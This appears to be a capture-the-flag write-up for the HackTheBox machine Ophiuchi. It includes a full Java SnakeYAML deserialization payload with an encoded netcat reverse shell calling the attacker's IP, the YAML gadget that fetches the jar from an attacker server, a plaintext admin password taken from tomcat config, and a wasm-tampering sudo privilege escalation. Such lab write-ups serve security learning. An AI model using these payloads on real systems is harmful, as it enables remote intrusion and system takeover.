---
title: Ophiuchi
layout: post
author: Bit Criminals Team
date: 2021-06-20 13:35:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://app.hackthebox.eu/machines/Ophiuchi
---

First, connect to HackTheBox using OpenVPN and join the machine.  
  
**NOTE: Replace $MACHINE_IP with HTB's machine IP and $tun0_IP with your machine's tun0 IP**  
  
As usual, after connecting and getting the IP, the first thing we did was an nmap scan:  
```bash
nmap -Pn -A $MACHINE_IP
```
Here are the results:

![](/images/v1per/ophiuchi1.png)

We see that we have port 22 and port 8080 open. Let's visit the website: **http://$MACHINE_IP:8080/**  
This is what we get:

![](/images/v1per/ophiuchi2.png)

So, this probably has some vulnerability related to YAML.  
Still, let's once check the hidden directories using gobuster:
```bash
gobuster dir -u http://$MACHINE_IP:8080 -w /usr/share/wordlists/dirb/common.txt -z -t 100
```
These are the results:

![](/images/v1per/ophiuchi3.png)

Two directories from the result are password-protected and we didn't really find much other than that. Let's focus on YAML for now.  
I searched the internet for "YAML Payloads" and found [this](https://github.com/artsploit/yaml-payload). Clone this repository in a subitable localtion and open the file **yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java**  
Now, I found [this site](https://pulsesecurity.co.nz/advisories/Insecure-YAML-Deserialisation).  
With this site as reference, I edited the **AwesomeScriptEngineFactory.java** to this for reverse shell:
```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;
import java.util.Base64;
import java.util.concurrent.TimeUnit;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
           
		String cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0_IP 1234 >/tmp/f";

		String b64Cmd = Base64.getEncoder().encodeToString(cmd.getBytes());
		cmd = "bash -c {echo,"+b64Cmd+"}|{base64,-d}|{bash,-i}";

		Runtime.getRuntime()
			.exec(cmd)
			.waitFor(30, TimeUnit.SECONDS);
				
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
``` 
Now, go to the **yaml-payload** directory and run these two commands:
```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```
In this folder, start a python simple http server using this command:
```bash
python3 -m http.server 80
```
and, start a netcat listener on your machine:
```bash
nc -lnvp 1234
```
Then, I copied this in the YAML text box in the website
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://$tun0_IP/yaml-payload.jar"]
  ]]
]
```
Click on **PARSE**, and check the listener.

![](/images/v1per/ophiuchi4.png)

Yay! We have got our shell.

In the home directory we get a user named admin which means we have to do user escalation from tomcat to admin.

Now,if we search a bit we will found some ssh login creds in the directory /opt/tomcat/conf.

username="admin" password="whythereisalimit"

Now, we do ssh login into the admin shell.

Then, it's time for root escalation.Doing, sudo -l we find this:

![](/images/Dr.DONN4/opihuchi1.png)

Now, we open the file /opt/wasm-functions/index.go
and we get this script.

```
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```
so, this script basically run a binary main.wasm and deploys a file deploy.sh with the condition that f which is a constant is 1.

Now,if we go to the /opt/wasm-functions directory we find a main.wasm file.Now, we move this wasm file from this directory to 
the temp directory and also create a deploy.sh file as we expose the fact that none of the path of these 
files is not mentioned in the script.Now, we run 

```sudo /usr/bin/go run /opt/wasm-functions/index.go```
But, we get a error "Not ready to deploy" which  is clearly becoz f is not equal to 1.

![](/images/Dr.DONN4/opihuchi2.png)

which means we have to chnage the main.wasm file.

Hence we tranferred the wasm file to our local machine.After a bit of research we found a way to convert main.wasm to main.wat
which is the readable form of the binary https://developer.mozilla.org/en-US/docs/WebAssembly/Text_format_to_wasm.
I used the commnads as directed in the blog and converted main.wsm to main.wat 
and I found this written in assembly.

```
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))

```
After a bit of research and learning of the wasm assembly we found that value of variable f is in i32.const which is currently 
0 and hence we change it to 1.Then, we send the wasm file back to the attack machine and run the same sudo command again and it 
got deployed this time.

![](/images/Dr.DONN4/opihuchi.png)

And we have the root flag.
